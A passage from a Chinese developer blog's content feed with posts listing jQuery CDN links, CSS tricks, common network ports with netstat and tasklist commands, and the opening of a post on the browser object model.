</code></pre><h2 id="微软压缩版引用地址-5"><a href="#微软压缩版引用地址-5" class="headerlink" title="微软压缩版引用地址"></a>微软压缩版引用地址</h2><pre><code class="html">&lt;script src=&quot;//ajax.aspnetcdn.com/ajax/jquery/jquery-1.10.2.min.js&quot;&gt;&lt;/script&gt;
</code></pre><h2 id="官网-jquery-压缩版引用地址-7"><a href="#官网-jquery-压缩版引用地址-7" class="headerlink" title="官网 jquery 压缩版引用地址"></a>官网 jquery 压缩版引用地址</h2><pre><code class="html">&lt;script src=&quot;//code.jquery.com/jquery-1.10.2.min.js&quot;&gt;&lt;/script&gt;
</code></pre><h2 id="下载链接-7"><a href="#下载链接-7" class="headerlink" title="下载链接"></a>下载链接</h2><blockquote><p><a href="http://oaq0p7t2g.bkt.clouddn.com/jquery-1.10.2.zip?attname=" target="_blank" rel="external">jquery-1.10.2.zip</a></p></blockquote><h1 id="jquery-1-9-1"><a href="#jquery-1-9-1" class="headerlink" title="jquery-1.9.1"></a>jquery-1.9.1</h1><h2 id="百度压缩版引用地址-6"><a href="#百度压缩版引用地址-6" class="headerlink" title="百度压缩版引用地址"></a>百度压缩版引用地址</h2><pre><code class="html">&lt;script src=&quot;//libs.baidu.com/jquery/1.9.1/jquery.min.js&quot;&gt;&lt;/script&gt;
</code></pre><h2 id="微软压缩版引用地址-6"><a href="#微软压缩版引用地址-6" class="headerlink" title="微软压缩版引用地址"></a>微软压缩版引用地址</h2><pre><code class="html">&lt;script src=&quot;//ajax.aspnetcdn.com/ajax/jquery/jquery-1.9.1.min.js&quot;&gt;&lt;/script&gt;
</code></pre><h2 id="官网-jquery-压缩版引用地址-8"><a href="#官网-jquery-压缩版引用地址-8" class="headerlink" title="官网 jquery 压缩版引用地址"></a>官网 jquery 压缩版引用地址</h2><pre><code class="html">&lt;script src=&quot;//code.jquery.com/jquery-1.9.1.min.js&quot;&gt;&lt;/script&gt;
</code></pre><h2 id="下载链接-8"><a href="#下载链接-8" class="headerlink" title="下载链接"></a>下载链接</h2><blockquote><p><a href="http://oaq0p7t2g.bkt.clouddn.com/jquery-1.9.1.zip?attname=" target="_blank" rel="external">jquery-1.9.1.zip</a></p></blockquote><h1 id="jquery-1-8-3"><a href="#jquery-1-8-3" class="headerlink" title="jquery-1.8.3"></a>jquery-1.8.3</h1><h2 id="百度压缩版引用地址-7"><a href="#百度压缩版引用地址-7" class="headerlink" title="百度压缩版引用地址"></a>百度压缩版引用地址</h2><pre><code class="html">&lt;script src=&quot;//libs.baidu.com/jquery/1.8.3/jquery.min.js&quot;&gt;&lt;/script&gt;
</code></pre><h2 id="微软压缩版引用地址-7"><a href="#微软压缩版引用地址-7" class="headerlink" title="微软压缩版引用地址"></a>微软压缩版引用地址</h2><pre><code class="html">&lt;script src=&quot;//ajax.aspnetcdn.com/ajax/jquery/jquery-1.8.3.min.js&quot;&gt;&lt;/script&gt;
</code></pre><h2 id="官网-jquery-压缩版引用地址-9"><a href="#官网-jquery-压缩版引用地址-9" class="headerlink" title="官网 jquery 压缩版引用地址"></a>官网 jquery 压缩版引用地址</h2><pre><code class="html">&lt;script src=&quot;//code.jquery.com/jquery-1.8.3.min.js&quot;&gt;&lt;/script&gt;
</code></pre><h2 id="下载链接-9"><a href="#下载链接-9" class="headerlink" title="下载链接"></a>下载链接</h2><blockquote><p><a href="http://oaq0p7t2g.bkt.clouddn.com/jquery-1.8.3.zip?attname=" target="_blank" rel="external">jquery-1.8.3.zip</a></p></blockquote><h1 id="jquery-1-7-2"><a href="#jquery-1-7-2" class="headerlink" title="jquery-1.7.2"></a>jquery-1.7.2</h1><h2 id="百度压缩版引用地址-8"><a href="#百度压缩版引用地址-8" class="headerlink" title="百度压缩版引用地址"></a>百度压缩版引用地址</h2><pre><code class="html">&lt;script src=&quot;//libs.baidu.com/jquery/1.7.2/jquery.min.js&quot;&gt;&lt;/script&gt;
</code></pre><h2 id="微软压缩版引用地址-8"><a href="#微软压缩版引用地址-8" class="headerlink" title="微软压缩版引用地址"></a>微软压缩版引用地址</h2><pre><code class="html">&lt;script src=&quot;//ajax.aspnetcdn.com/ajax/jquery/jquery-1.7.2.min.js&quot;&gt;&lt;/script&gt;
</code></pre><h2 id="官网-jquery-压缩版引用地址-10"><a href="#官网-jquery-压缩版引用地址-10" class="headerlink" title="官网 jquery 压缩版引用地址"></a>官网 jquery 压缩版引用地址</h2><pre><code class="html">&lt;script src=&quot;//code.jquery.com/jquery-1.7.2.min.js&quot;&gt;&lt;/script&gt;
</code></pre><h2 id="下载链接-10"><a href="#下载链接-10" class="headerlink" title="下载链接"></a>下载链接</h2><blockquote><p><a href="http://oaq0p7t2g.bkt.clouddn.com/jquery-1.7.2.zip?attname=" target="_blank" rel="external">jquery-1.7.2.zip</a></p></blockquote><h1 id="jquery-1-6-4"><a href="#jquery-1-6-4" class="headerlink" title="jquery-1.6.4"></a>jquery-1.6.4</h1><h2 id="百度压缩版引用地址-9"><a href="#百度压缩版引用地址-9" class="headerlink" title="百度压缩版引用地址"></a>百度压缩版引用地址</h2><pre><code class="html">&lt;script src=&quot;//libs.baidu.com/jquery/1.6.4/jquery.min.js&quot;&gt;&lt;/script&gt;
</code></pre><h2 id="微软压缩版引用地址-9"><a href="#微软压缩版引用地址-9" class="headerlink" title="微软压缩版引用地址"></a>微软压缩版引用地址</h2><pre><code class="html">&lt;script src=&quot;//ajax.aspnetcdn.com/ajax/jquery/jquery-1.6.4.min.js&quot;&gt;&lt;/script&gt;
</code></pre><h2 id="官网-jquery-压缩版引用地址-11"><a href="#官网-jquery-压缩版引用地址-11" class="headerlink" title="官网 jquery 压缩版引用地址"></a>官网 jquery 压缩版引用地址</h2><pre><code class="html">&lt;script src=&quot;//code.jquery.com/jquery-1.6.4.min.js&quot;&gt;&lt;/script&gt;
</code></pre><h2 id="下载链接-11"><a href="#下载链接-11" class="headerlink" title="下载链接"></a>下载链接</h2><blockquote><p><a href="http://oaq0p7t2g.bkt.clouddn.com/jquery-1.6.4.zip?attname=" target="_blank" rel="external">jquery-1.6.4.zip</a></p></blockquote><h1 id="jquery-1-5-2"><a href="#jquery-1-5-2" class="headerlink" title="jquery-1.5.2"></a>jquery-1.5.2</h1><h2 id="百度压缩版引用地址-10"><a href="#百度压缩版引用地址-10" class="headerlink" title="百度压缩版引用地址"></a>百度压缩版引用地址</h2><pre><code class="html">&lt;script src=&quot;//libs.baidu.com/jquery/1.5.2/jquery.min.js&quot;&gt;&lt;/script&gt;
</code></pre><h2 id="微软压缩版引用地址-10"><a href="#微软压缩版引用地址-10" class="headerlink" title="微软压缩版引用地址"></a>微软压缩版引用地址</h2><pre><code class="html">&lt;script src=&quot;//ajax.aspnetcdn.com/ajax/jquery/jquery-1.5.2.min.js&quot;&gt;&lt;/script&gt;
</code></pre><h2 id="官网-jquery-压缩版引用地址-12"><a href="#官网-jquery-压缩版引用地址-12" class="headerlink" title="官网 jquery 压缩版引用地址"></a>官网 jquery 压缩版引用地址</h2><pre><code class="html">&lt;script src=&quot;//code.jquery.com/jquery-1.5.2.min.js&quot;&gt;&lt;/script&gt;
</code></pre><h2 id="下载链接-12"><a href="#下载链接-12" class="headerlink" title="下载链接"></a>下载链接</h2><blockquote><p><a href="http://oaq0p7t2g.bkt.clouddn.com/jquery-1.5.2.zip?attname=" target="_blank" rel="external">jquery-1.5.2.zip</a></p></blockquote><h1 id="jquery-1-4-4"><a href="#jquery-1-4-4" class="headerlink" title="jquery-1.4.4"></a>jquery-1.4.4</h1><h2 id="百度压缩版引用地址-11"><a href="#百度压缩版引用地址-11" class="headerlink" title="百度压缩版引用地址"></a>百度压缩版引用地址</h2><pre><code class="html">&lt;script src=&quot;//libs.baidu.com/jquery/1.4.4/jquery.min.js&quot;&gt;&lt;/script&gt;
</code></pre><h2 id="微软压缩版引用地址-11"><a href="#微软压缩版引用地址-11" class="headerlink" title="微软压缩版引用地址"></a>微软压缩版引用地址</h2><pre><code class="html">&lt;script src=&quot;//ajax.aspnetcdn.com/ajax/jquery/jquery-1.4.4.min.js&quot;&gt;&lt;/script&gt;
</code></pre><h2 id="官网-jquery-压缩版引用地址-13"><a href="#官网-jquery-压缩版引用地址-13" class="headerlink" title="官网 jquery 压缩版引用地址"></a>官网 jquery 压缩版引用地址</h2><pre><code class="html">&lt;script src=&quot;//code.jquery.com/jquery-1.4.4.min.js&quot;&gt;&lt;/script&gt;
</code></pre><h2 id="下载链接-13"><a href="#下载链接-13" class="headerlink" title="下载链接"></a>下载链接</h2><blockquote><p><a href="http://oaq0p7t2g.bkt.clouddn.com/jquery-1.4.4.zip?attname=" target="_blank" rel="external">jquery-1.4.4.zip</a></p></blockquote><h1 id="jquery-1-4-2"><a href="#jquery-1-4-2" class="headerlink" title="jquery-1.4.2"></a>jquery-1.4.2</h1><h2 id="百度压缩版引用地址-12"><a href="#百度压缩版引用地址-12" class="headerlink" title="百度压缩版引用地址"></a>百度压缩版引用地址</h2><pre><code class="html">&lt;script src=&quot;//libs.baidu.com/jquery/1.4.2/jquery.min.js&quot;&gt;&lt;/script&gt;
</code></pre><h2 id="微软压缩版引用地址-12"><a href="#微软压缩版引用地址-12" class="headerlink" title="微软压缩版引用地址"></a>微软压缩版引用地址</h2><pre><code class="html">&lt;script src=&quot;//ajax.aspnetcdn.com/ajax/jquery/jquery-1.4.2.min.js&quot;&gt;&lt;/script&gt;
</code></pre><h2 id="官网-jquery-压缩版引用地址-14"><a href="#官网-jquery-压缩版引用地址-14" class="headerlink" title="官网 jquery 压缩版引用地址"></a>官网 jquery 压缩版引用地址</h2><pre><code class="html">&lt;script src=&quot;//code.jquery.com/jquery-1.4.2.min.js&quot;&gt;&lt;/script&gt;
</code></pre><h2 id="下载链接-14"><a href="#下载链接-14" class="headerlink" title="下载链接"></a>下载链接</h2><blockquote><p><a href="http://oaq0p7t2g.bkt.clouddn.com/jquery-1.4.2.zip?attname=" target="_blank" rel="external">jquery-1.4.2.zip</a></p></blockquote><h1 id="jquery-1-3-2"><a href="#jquery-1-3-2" class="headerlink" title="jquery-1.3.2"></a>jquery-1.3.2</h1><h2 id="百度压缩版引用地址-13"><a href="#百度压缩版引用地址-13" class="headerlink" title="百度压缩版引用地址"></a>百度压缩版引用地址</h2><pre><code class="html">&lt;script src=&quot;//libs.baidu.com/jquery/1.3.2/jquery.min.js&quot;&gt;&lt;/script&gt;
</code></pre><h2 id="微软压缩版引用地址-13"><a href="#微软压缩版引用地址-13" class="headerlink" title="微软压缩版引用地址"></a>微软压缩版引用地址</h2><pre><code class="html">&lt;script src=&quot;//ajax.aspnetcdn.com/ajax/jquery/jquery-1.3.2.min.js&quot;&gt;&lt;/script&gt;
</code></pre><h2 id="官网-jquery-压缩版引用地址-15"><a href="#官网-jquery-压缩版引用地址-15" class="headerlink" title="官网 jquery 压缩版引用地址"></a>官网 jquery 压缩版引用地址</h2><pre><code class="html">&lt;script src=&quot;//code.jquery.com/jquery-1.3.2.min.js&quot;&gt;&lt;/script&gt;
</code></pre><h2 id="下载链接-15"><a href="#下载链接-15" class="headerlink" title="下载链接"></a>下载链接</h2><blockquote><p><a href="http://oaq0p7t2g.bkt.clouddn.com/jquery-1.3.2.zip?attname=" target="_blank" rel="external">jquery-1.3.2.zip</a></p></blockquote><h1 id="jquery-1-2-3"><a href="#jquery-1-2-3" class="headerlink" title="jquery-1.2.3"></a>jquery-1.2.3</h1><h2 id="百度压缩版引用地址-14"><a href="#百度压缩版引用地址-14" class="headerlink" title="百度压缩版引用地址"></a>百度压缩版引用地址</h2><pre><code class="html">&lt;script src=&quot;//libs.baidu.com/jquery/1.2.3/jquery.min.js&quot;&gt;&lt;/script&gt;
</code></pre><h2 id="微软压缩版引用地址-14"><a href="#微软压缩版引用地址-14" class="headerlink" title="微软压缩版引用地址"></a>微软压缩版引用地址</h2><pre><code class="html">&lt;script src=&quot;//ajax.aspnetcdn.com/ajax/jquery/jquery-1.2.3.min.js&quot;&gt;&lt;/script&gt;
</code></pre><h2 id="官网-jquery-压缩版引用地址-16"><a href="#官网-jquery-压缩版引用地址-16" class="headerlink" title="官网 jquery 压缩版引用地址"></a>官网 jquery 压缩版引用地址</h2><pre><code class="html">&lt;script src=&quot;//code.jquery.com/jquery-1.2.3.min.js&quot;&gt;&lt;/script&gt;
</code></pre><h2 id="下载链接-16"><a href="#下载链接-16" class="headerlink" title="下载链接"></a>下载链接</h2><blockquote><p><a href="http://oaq0p7t2g.bkt.clouddn.com/jquery-1.2.3.zip?attname=" target="_blank" rel="external">jquery-1.2.3.zip</a></p></blockquote><!-- rebuild by neat -->]]></content>
      
        <categories>
            
            <category> web </category>
            
        </categories>
        
        
        <tags>
            
            <tag> JavaScript </tag>
            
            <tag> jQuery </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[CSS 的一些冷知识]]></title>
      <url>/2016/08/css-cold-knowledge/</url>
      <content type="html"><![CDATA[<!-- build time:Sat Sep 02 2017 22:35:16 GMT+0800 (中国标准时间) --><p>记录常用而不易于记忆的 css 自定义代码<a id="more"></a></p><h1 id="常见实用技巧"><a href="#常见实用技巧" class="headerlink" title="常见实用技巧"></a>常见实用技巧</h1><pre><code class="css">/*禁止长按链接与图片弹出菜单*/
a,img { -webkit-touch-callout: none }

/*禁止ios和android用户选中文字*/
html,body {-webkit-user-select:none; user-select: none; }

/*改变输入框placeholder的颜色值*/
::-webkit-input-placeholder { /* WebKit browsers */
color: #999; }
:-moz-placeholder { /* Mozilla Firefox 4 to 18 */
color: #999; }
::-moz-placeholder { /* Mozilla Firefox 19+ */
color: #999; }
:-ms-input-placeholder { /* Internet Explorer 10+ */
color: #999; }
input:focus::-webkit-input-placeholder{ color:#999; }

/*android上去掉语音输入按钮*/
input::-webkit-input-speech-button {display: none}

/* 消除 transition 闪屏 */
.css {
    -webkit-transform-style: preserve-3d;
    -webkit-backface-visibility: hidden;
    -webkit-perspective: 1000;
}
</code></pre><h1 id="placeholder"><a href="#placeholder" class="headerlink" title="placeholder"></a>placeholder</h1><p>在 <code>input</code> 标签中设置 <code>placeholder</code> 属性时，有时候因为需求，要修改占位符的默认颜色或者字体大小，这是就可以用下面的 <code>css</code>，<code>For Example:</code></p><pre><code class="css">/* firefox */
input::-moz-placeholder {
  color: red;
  font-size: 18px;
}

/* IE */
input:-ms-input-placeholder {
  color: red;
  font-size: 18px;
}

/* chrome */
input::-webkit-input-placeholder {
  color: red;
  font-size: 18px;
}
</code></pre><p>需要注意的是不同浏览器写法不同：</p><ul><li>都要加上各自浏览器的前缀(如 <code>-webkit-</code>)</li><li><code>firefox</code> 的 <code>placeholder</code> 的前面没有 <code>input-</code></li><li><code>firefox</code> 与 <code>chrome</code> 都是 <code>::</code> 两个冒号，而 IE 则是一个 <code>:</code></li><li>低版本的浏览器与新版本浏览器可能写法不同</li></ul><h1 id="下拉框的小三角"><a href="#下拉框的小三角" class="headerlink" title="下拉框的小三角"></a>下拉框的小三角</h1><p><code>select</code> 标签会出现小三角，通常这个小三角都会去掉，或者用背景图片的方式替换为符合要求的样子。 去掉小三角的 <code>css</code>，<code>For Example:</code></p><pre><code class="css">select {
  -webkit-appearance: none; /* chrome */
  -moz-appearance: none; /* firefox */
  /* 在IE浏览器中目前还没找到可以去掉小三角的方法。 */
}
</code></pre><h1 id="input-type-number-右边的-spinners"><a href="#input-type-number-右边的-spinners" class="headerlink" title="input[type=number] 右边的 spinners"></a>input[type=number] 右边的 spinners</h1><p><code>nput[type=number]</code> 通常用在移动端设备上，浏览器会识别 <code>number</code> 输入类型，然后改变数字键盘来适应它。但是它会出现 <code>spinners</code>，一般不需要它。去掉 <code>spinners</code> 的 <code>css</code> 如下：</p><pre><code class="css">/* firefox */
input[type=&#39;number&#39;] {
  -moz-appearance: textfield;
}

/* chrome */
input[type=number]::-webkit-inner-spin-button,
input[type=number]::-webkit-outer-spin-button {
  -webkit-appearance: none;
  margin: 0;
}
</code></pre><h1 id="webkit-tap-highlight-color"><a href="#webkit-tap-highlight-color" class="headerlink" title="-webkit-tap-highlight-color"></a>-webkit-tap-highlight-color</h1><p>在移动端浏览器上(如微信、QQ 内置浏览器)，当你点击一个链接或者通过 <code>JavaScript</code> 定义的可点击元素的时候，会出现蓝色边框，我是很讨厌这个边框的，所以一般会这样去除，<code>For Example:</code></p><pre><code class="css">a,button,input,textarea {
    -webkit-tap-highlight-color: rgba(0,0,0,0);
    -webkit-user-modify:read-write-plaintext-only; //-webkit-user-modify有个副作用，就是输入法不再能够输入多个字符
}
/*也可以...，简单粗暴*/
* { -webkit-tap-highlight-color: rgba(0,0,0,0); }
</code></pre><p>将高亮色设为透明，这样就看不到蓝色边框了。</p><h1 id="滚动条"><a href="#滚动条" class="headerlink" title="滚动条"></a>滚动条</h1><p><code>webkit</code> 现在支持拥有 <code>overflow</code> 属性的区域，<code>列表框</code>，<code>下拉菜单</code>，<code>textarea</code> 的滚动条自定义样式。有时候需要把滚动条去掉，特别是页面中出现几条滚动条的时候，<code>For Example:</code></p><pre><code class="css">::-webkit-scrollbar {
  width: 0; /* 这将去除整个页面的滚动条 */
}
</code></pre><p>设置滚动条的宽度为 <code>0</code> 就可以去除滚动条了。</p><h1 id="文字换行"><a href="#文字换行" class="headerlink" title="文字换行"></a>文字换行</h1><p><code>For Example:</code></p><pre><code class="css">.text-warp{
  /* 强制不换行 */
  white-space: nowrap;

  /* 自动换行 */
  word-wrap: break-word;
  word-break: normal;

  /* 强制英文单词断行 */
  word-break: break-all;
}
</code></pre><h1 id="文字两端对齐"><a href="#文字两端对齐" class="headerlink" title="文字两端对齐"></a>文字两端对齐</h1><p><code>For Example:</code></p><pre><code class="css">.text-justify {
  text-align: justify;
  text-justify: inter-ideogra;
}
</code></pre><h1 id="去掉色焦点框"><a href="#去掉色焦点框" class="headerlink" title="去掉色焦点框"></a>去掉色焦点框</h1><p>去掉 Webkit(chrome) 浏览器中 input(文本框) 或 textarea 的黄色焦点框，<code>For Example:</code></p><pre><code class="css">input,
button,
select,
textarea {
  outline: none;
}

textarea {
  font-size: 13px;
  resize: none;
}
</code></pre><h2 id="去掉黄色背景"><a href="#去掉黄色背景" class="headerlink" title="去掉黄色背景"></a>去掉黄色背景</h2><blockquote><p>chrome 表单自动填充后，input 文本框的背景会变成黄色的，通过审查元素可以看到这是由于 chrome 会默认给自动填充的 input 表单加上 input:-webkit-autofill 私有属性，然后对其赋予以下样式：</p></blockquote><p><code>For Example:</code></p><pre><code class="css">input: -webkit-autofill {
  background-color: #FAFFBD;
  background-image: none;
  color: #000;
}
</code></pre><p>在有些情况下，这个黄色的背景会影响到我们界面的效果。解决方法请往下看。</p><h3 id="让-input-文本框是纯色背景的"><a href="#让-input-文本框是纯色背景的" class="headerlink" title="让 input 文本框是纯色背景的"></a>让 input 文本框是纯色背景的</h3><p>可以对 <code>input:-webkit-autofill</code> 使用足够大的纯色内阴影来覆盖 <code>input</code> 输入框的黄色背景，<code>For Example:</code></p><pre><code class="css">input: -webkit-autofill {
  -webkit-box-shadow: 0 0 0 1000 white inset;
  border: 1px solid #CCC !important;
}
</code></pre><p>如果你有使用圆角等属性，或者发现输入框的长度高度不太对，可以对其进行调整，除了 <code>chrome</code> 默认定义的 <code>background-color</code>， <code>background-image</code>，<code>color</code> 不能用 <code>!important</code> 提升其优先级以外，其他的属性均可使用 <code>!important</code> 提升其优先级，<code>For Example:</code></p><pre><code class="css">input: -webkit-autofill {
  -webkit-box-shadow: 0 0 0 1000 white inset;
  border: 1px solid #CCC !important;
  height: 27px !important;
  line-height: 27px !important;
  border-radius: 0 4px 4px 0;
}
</code></pre><h3 id="input-文本框是使用图片作为背景的"><a href="#input-文本框是使用图片作为背景的" class="headerlink" title="input 文本框是使用图片作为背景的"></a>input 文本框是使用图片作为背景的</h3><p>这个比较麻烦，目前还没找到完美的解决方法，有两种选择：</p><ul><li>如果你的图片背景不太复杂，只有一些简单的内阴影，那个人觉得完全可以使用上面介绍的方法用足够大的纯色内阴影去覆盖掉黄色背景，此时只不过是没有了原来的内阴影效果罢了。</li><li>如果你实在想留住原来的内阴影效果，那就只能牺牲 chrome 自动填充表单的功能，使用 <code>JavaScript</code> 去实现，<code>For Example:</code></li></ul><pre><code class="javascript">$(function () {
  if (navigator.userAgent.toLowerCase().indexOf(&quot;chrome&quot;) &gt;= 0) {
    $(window).load(function () {
      $(&#39;ul input:not(input[type=submit])&#39;).each(function () {
        var outHtml = this.outerHTML;
        $(this).append(outHtml);
      });
    });
  }
});
</code></pre><h3 id="关闭自动填充表单功能"><a href="#关闭自动填充表单功能" class="headerlink" title="关闭自动填充表单功能"></a>关闭自动填充表单功能</h3><p>如果你既不想使用 <code>JavaScript</code>，也不想用 <code>css</code>，好吧，在 <code>form</code> 标签上直接关闭了表单的自动填充功能：<code>autocomplete=&quot;off&quot;</code>。<code>For Example:</code></p><pre><code class="html">&lt;from action=&quot;&quot; autocomplete=&quot;off&quot;&gt;
  ...
&lt;/from&gt;
</code></pre><h1 id="seperate-table"><a href="#seperate-table" class="headerlink" title="seperate-table"></a>seperate-table</h1><p><code>For Example:</code></p><pre><code class="css">.tab {
  border-collapse: separate;
  border: 1px solid #e0e0e0;
}

.tab th,
.tab td {
  padding: 3px;
  font-size: 12px;
  background: #f5f9fb;
  border: 1px solid;
  border-color: #fff #deedf6 #deedf6 #fff;
}

.tab th {
  background: #edf4f0;
}

.tab tr.even td {
  background: #fff;
}
</code></pre><p><code>For Example:</code></p><pre><code class="html">&lt;table class=&quot;tab&quot; width=&quot;100%&quot; cellpadding=&quot;0&quot; cellspacing=&quot;0&quot; border=&quot;0&quot;&gt;
  &lt;tr&gt;
    &lt;th&gt;111&lt;/th&gt;
    &lt;td&gt;222&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;th&gt;111&lt;/th&gt;
    &lt;td&gt;222&lt;/td&gt;
  &lt;/tr&gt;
&lt;/table&gt;
</code></pre><blockquote><p><a href="//codepen.io/anon/pen/zBbRkJ?editors=1100#0">codepen 调试地址</a></p></blockquote><h1 id="清除浮动，万能的-float-闭合"><a href="#清除浮动，万能的-float-闭合" class="headerlink" title="清除浮动，万能的 float 闭合"></a>清除浮动，万能的 float 闭合</h1><p>给需要闭合的 DIV（class为clearfix） 加上如下的 CSS 样式即可，<code>For Example:</code></p><pre><code class="css">.clearfix:after {
  content: &quot;.&quot;;
  display: block;
  height: 0;
  clear: both;
  visibility: hidden;
}

*html .clearfix {
  height: 1%;
}

*+html .clearfix {
  height: 1%;
}

.clearfix {
  display: inline-block;
}

.clearfix {
  display: block;
}
</code></pre><p>不过貌似这样有点麻烦，呵呵，大前端常用的是下面的，<code>For Example:</code></p><pre><code class="css">.clear {
  clear: both;
  height: 0;
  overflow: hidden;
}
</code></pre><blockquote><p>上诉办法是在需要清除浮动的地方加个 div.clear 或者 br.clear，我们知道这样能解决基本清浮动问题。 但是这种方法的最大缺陷就是改变了 html 结构，虽然只是加个 div</p></blockquote><!-- rebuild by neat -->]]></content>
      
        <categories>
            
            <category> web </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CSS </tag>
            
            <tag> Layout </tag>
            
            <tag> Code </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[常见的端口号以及其对应的应用程序或服务]]></title>
      <url>/2016/08/common-port/</url>
      <content type="html"><![CDATA[<!-- build time:Sat Sep 02 2017 22:35:16 GMT+0800 (中国标准时间) --><p>列出 TCP/UDP 协议常见的端口号占用情况，以助于分析该服务器开放了哪些端口号，或者程序占用了哪些端口号<a id="more"></a></p><h1 id="如何查看"><a href="#如何查看" class="headerlink" title="如何查看"></a>如何查看</h1><h2 id="Windows-系统"><a href="#Windows-系统" class="headerlink" title="Windows 系统"></a>Windows 系统</h2><p>通过 <code>netstat</code> 列出所有端口的使用情况， <code>For Example:</code></p><pre><code class="bash">netstat -ano
</code></pre><p>通过 <code>findstr</code> 查询包含关键字的端口使用情况， <code>For Example:</code></p><pre><code class="bash">netsata -ano | findstr &quot;:80&quot;
</code></pre><p>通过 <code>tasklist</code> 查询哪个程序或应用占用该端口对应的 <code>PID</code>，<code>For Example:</code></p><pre><code class="bash">tasklist | findstr &quot;2180&quot;
</code></pre><blockquote><p>Windows 系统除了通过命令查询外，通过任务管理器也可查询进程的 PID 以及其占用情况。</p></blockquote><p><img src="http://oaq0p7t2g.bkt.clouddn.com/taskmgr.png" alt="任务管理器"></p><h2 id="Liunx-系统"><a href="#Liunx-系统" class="headerlink" title="Liunx 系统"></a>Liunx 系统</h2><p>通过 <code>netstat</code> 列出监听的端口，<code>For Example:</code></p><pre><code class="bash">netstat -tlun
</code></pre><p>通过 <code>netstat</code> 列出所有的网络连接，<code>For Example:</code></p><pre><code class="bash">netstat -an
</code></pre><p>通过 <code>ps</code> 查看进程占用状态，<code>For Example:</code></p><pre><code class="bash">ps -ef | grep sshd
</code></pre><h2 id="通过工具扫描"><a href="#通过工具扫描" class="headerlink" title="通过工具扫描"></a>通过工具扫描</h2><h1 id="常见端口号"><a href="#常见端口号" class="headerlink" title="常见端口号"></a>常见端口号</h1><h2 id="TCP-协议相关"><a href="#TCP-协议相关" class="headerlink" title="TCP 协议相关"></a>TCP 协议相关</h2><ul><li><code>20</code> =&gt; FTP（文件传输协议） 传输数据端口，用于纯属数据</li><li><code>21</code> =&gt; FTP（文件传输协议） 连接端口，用于登陆认证</li><li><code>22</code> =&gt; SSH（安全外壳协议） 加密的远程连接，SFTP（安全的文件传输协议） 传输安全的数据</li><li><code>23</code> =&gt; Telnet（远程终端协议） 相对不安全的远程连接</li><li><code>25</code> =&gt; SMTP（简单邮件传输协议） 使用的端口</li><li><code>53</code> =&gt; DNS 服务器开放的端口，入侵者可能是试图进行区域传递（TCP），所以防火墙常常过滤或记录该端口</li><li><code>80</code>/<code>8080</code>/<code>3128</code>/<code>8081</code>/<code>9080</code> =&gt; HTTP（超文本传输协议） 使用的端口</li><li><code>109</code> =&gt; POP2（邮件协议2） 服务器开放的端口</li><li><code>110</code> =&gt; POP3（邮件协议3） 服务器开放的端口，用于接收邮件，客户端访问服务器的邮件服务</li><li><code>139</code> =&gt; 文件共享使用的端口</li><li><code>443</code> =&gt; HTTPS（安全套接字层的超文本传输协议） 默认端口，传输数据更加安全</li><li><code>445</code> =&gt; SMB（文件共享服务）开放的端口</li><li><code>1433</code> =&gt; SQL Server 默认的端口，用于供 SQL Server 对外提供服务</li><li><code>1521</code> =&gt; Oracle 数据库默认端口</li><li><code>3306</code> =&gt; MySQL 数据库默认端口</li><li><code>3389</code> =&gt; 远程桌面使用的端口</li><li><code>8080</code> =&gt; Tomcat 服务器的默认端口</li></ul><h2 id="UDP-协议相关"><a href="#UDP-协议相关" class="headerlink" title="UDP 协议相关"></a>UDP 协议相关</h2><ul><li><code>53</code> =&gt; DNS 服务器开放的端口，入侵者可能是试图进行欺骗DNS（UDP）或隐藏其他的通信，所以防火墙常常过滤或记录该端口</li><li><code>69</code> =&gt; TFTP（简单文件传输协议） 默认的端口号</li><li><code>139</code> =&gt; 文件共享使用的端口</li><li><code>161</code> =&gt; SNMP（简单网络管理协议） 入侵者常探测的端口</li><li><code>162</code> =&gt; SNMP（简单网络管理协议） 默认的端口号</li><li><code>445</code> =&gt; SMB（文件共享服务）开放的端口</li><li><code>1434</code> =&gt; SQL Server 默认的端口，于向请求者返回 SQL Server 使用了哪个 TCP/IP 端口</li></ul><h2 id="更多请下载文档查看"><a href="#更多请下载文档查看" class="headerlink" title="更多请下载文档查看"></a>更多请下载文档查看</h2><blockquote><p>请下载查看 <a href="http://oaq0p7t2g.bkt.clouddn.com/%E5%B8%B8%E8%A7%81TCP%E5%92%8CUDP%E7%AB%AF%E5%8F%A3%E5%88%97%E8%A1%A8.doc?attname=" target="_blank" rel="external">常见TCP和UDP端口列表.doc</a></p></blockquote><!-- rebuild by neat -->]]></content>
      
        <categories>
            
            <category> networking </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Liunx </tag>
            
            <tag> Security </tag>
            
            <tag> Pentest </tag>
            
            <tag> Windows </tag>
            
            <tag> Network </tag>
            
            <tag> Protocol </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[浏览器对象模型]]></title>
      <url>/2016/08/browser-object-model/</url>
      <content type="html"><![CDATA[<!-- build time:Sat Sep 02 2017 22:35:16 GMT+0800 (中国标准时间) --><p>BOM (Browser Object Model) 是指浏览器对象模型，是用于描述这种对象与对象之间层次关系的模型<a id="more"></a></p><h1 id="BOM-的定义"><a href="#BOM-的定义" class="headerlink" title="BOM 的定义"></a>BOM 的定义</h1><ul><li><code>BOM</code> 是 <code>browser object model</code> 的缩写，简称浏览器对象模型</li><li><code>BOM</code> 提供了独立于内容而与浏览器窗口进行交互的对象</li><li>由于 <code>BOM</code>主要用于管理窗口与窗口之间的通讯，因此其核心对象是 <code>window</code></li><li><code>BOM</code> 由一系列相关的对象构成，并且每个对象都提供了很多方法与属性</li><li><code>BOM</code> 缺乏标准，<code>JavaScript</code> 语法的标准化组织是 <code>ECMA</code>，<code>DOM</code> 的标准化组织是 <code>W3C</code></li><li><code>BOM</code> 最初是 <code>Netscape</code> 浏览器标准的一部分</li></ul><h2 id="BOM-的结构图"><a href="#BOM-的结构图" class="headerlink" title="BOM 的结构图"></a>BOM 的结构图</h2><blockquote><p>在线查看 <a href="http://oaq0p7t2g.bkt.clouddn.com/browser-object-model.jpg?attname=" target="_blank" rel="external">browser-object-model.jpg</a><br><br>请下载查看 <a href="http://oaq0p7t2g.bkt.clouddn.com/browser-object-model.jpg?attname=" target="_blank" rel="external">browser-object-model.jpg</a></p></blockquote><h2 id="BOM-和-DOM-的不同之处"><a href="#BOM-和-DOM-的不同之处" class="headerlink" title="BOM 和 